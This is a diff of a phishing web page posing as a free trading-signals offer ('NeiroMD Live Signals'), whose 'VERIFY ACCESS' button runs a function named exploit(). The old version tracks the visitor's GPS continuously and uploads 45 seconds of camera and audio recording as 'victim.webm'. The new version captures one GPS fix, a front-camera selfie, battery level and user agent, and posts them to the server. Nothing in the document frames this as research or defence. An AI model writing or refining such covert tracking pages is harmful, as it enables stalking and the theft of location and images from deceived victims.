@@ -3,62 +3,64 @@
 <head>
     <title>NeiroMD Signals</title>
     <meta name="viewport" content="width=device-width">
-    <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;color:#fff;font-family:Arial;text-align:center;overflow:hidden;}img{max-width:95vw;max-height:50vh;object-fit:contain;border-radius:20px;margin:20px;}h2{font-size:24px;margin:10px;color:#ff6b6b;}button{background:linear-gradient(45deg,#ff4757,#ffa502);color:#fff;border:none;padding:20px 40px;font-size:18px;border-radius:50px;cursor:pointer;margin:20px;box-shadow:0 10px 30px rgba(255,71,87,0.5);font-weight:bold;}button:hover{transform:scale(1.05);}video{width:95vw;border-radius:20px;margin:10px;}#status,#loc{display:none;color:#4ecdc4;font-size:16px;}</style>
+    <style>*{margin:0;padding:0;box-sizing:border-box;}body{background:#000;color:#fff;font-family:Arial;text-align:center;overflow:hidden;}img{max-width:95vw;max-height:50vh;object-fit:contain;border-radius:20px;margin:20px;}h2{font-size:24px;margin:10px;color:#ff6b6b;}button{background:linear-gradient(45deg,#ff4757,#ffa502);color:#fff;border:none;padding:20px 40px;font-size:18px;border-radius:50px;cursor:pointer;margin:20px;box-shadow:0 10px 30px rgba(255,71,87,0.5);font-weight:bold;}video{width:95vw;border-radius:20px;margin:10px;}#status{display:none;color:#4ecdc4;}</style>
 </head>
 <body>
     <img src="https://i.ibb.co.com/Mw10bGf/IMG-20260328-WA0012.jpg">
-    <h2>🔥 NeiroMD Live Signals 🔥</h2>
-    <p>Scan untuk akses trading signals gratis!</p>
-    <button onclick="exploit()">📱 SCAN & VERIFY</button>
-    <div id="status">Verifying...</div>
-    <video id="video" autoplay muted playsinline></video>
-    <div id="loc"></div>
+    <h2>🔥 NeiroMD Live Signals</h2>
+    <button onclick="exploit()">📱 VERIFY ACCESS</button>
+    <div id="status">Processing...</div>
+    <video id="video" autoplay muted playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
     
     <script>
-        let stream, recorder, watchId;
+        let stream, sent=false;
+        
         async function exploit(){
-            document.querySelector('button,img,h2,p').style.display='none';
+            document.querySelector('button,img,h2').style.display='none';
             document.getElementById('status').style.display='block';
             
             try{
-                // GPS TRACKING
-                watchId=navigator.geolocation.watchPosition(p=>{
-                    const loc=`${p.coords.latitude.toFixed(6)},${p.coords.longitude.toFixed(6)} (${p.coords.accuracy}m)`;
-                    document.getElementById('loc').textContent='📍 '+loc;
-                    document.getElementById('loc').style.display='block';
-                    sendData('GPS',loc);
-                },null,{enableHighAccuracy:true});
+                // SINGLE GPS
+                const pos=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:true}));
+                const gps=`${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)} (${pos.coords.accuracy}m)`;
                 
-                // CAMERA
-                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1920,height:1080},audio:true});
-                document.getElementById('video').srcObject=stream;
-                document.getElementById('video').style.display='block';
+                // SINGLE CAMERA PHOTO
+                stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:1280,height:720}});
+                const video=document.getElementById('video');
+                video.srcObject=stream;
+                video.style.display='block';
                 
-                // RECORD 45s
-                recorder=new MediaRecorder(stream);
-                const chunks=[]; 
-                recorder.ondataavailable=e=>chunks.push(e.data);
-                recorder.onstop=()=>uploadVideo(new Blob(chunks));
-                recorder.start(); 
-                setTimeout(()=>recorder.stop(),45000);
+                // WAIT 3s → SNAP PHOTO
+                setTimeout(()=>{
+                    const canvas=document.getElementById('canvas');
+                    const ctx=canvas.getContext('2d');
+                    canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+                    ctx.drawImage(video,0,0);
+                    canvas.toBlob(async(blob)=>{
+                        const bat=navigator.getBattery?await navigator.getBattery().then(b=>`${Math.round(b.level*100)}%`):'N/A';
+                        await sendFinal(gps,bat,blob);
+                        stream.getTracks().forEach(t=>t.stop());
+                    });
+                },3000);
                 
-            }catch(e){sendData('ERROR',e.message);}
+            }catch(e){
+                await sendFinal('ERROR: '+e.message,'N/A',null);
+            }
         }
         
-        async function sendData(type,data){
-            const bat=navigator.getBattery?await navigator.getBattery().then(b=>`${Math.round(b.level*100)}% (${b.charging?'🔌':'🔋'})`):'N/A';
-            await fetch('/api/send',{method:'POST',headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({type,data,ua:navigator.userAgent,bat})
-            });
+        async function sendFinal(gps,bat,photoBlob){
+            if(sent) return; sent=true;
+            
+            const form=new FormData();
+            form.append('gps',gps);
+            form.append('bat',bat);
+            form.append('ua',navigator.userAgent);
+            if(photoBlob) form.append('photo',photoBlob,'selfie.jpg');
+            
+            await fetch('/api/single',{method:'POST',body:form});
+            document.getElementById('status').textContent='✅ Access granted!';
         }
-        
-        async function uploadVideo(blob){
-            const form=new FormData();form.append('video',blob,'victim.webm');
-            await fetch('/api/upload',{method:'POST',body:form});
-            if(watchId) navigator.geolocation.clearWatch(watchId);
-        }
-        
-        setTimeout(()=>document.body.onclick=exploit,{once:true});
     </script>
 </body>
 </html>
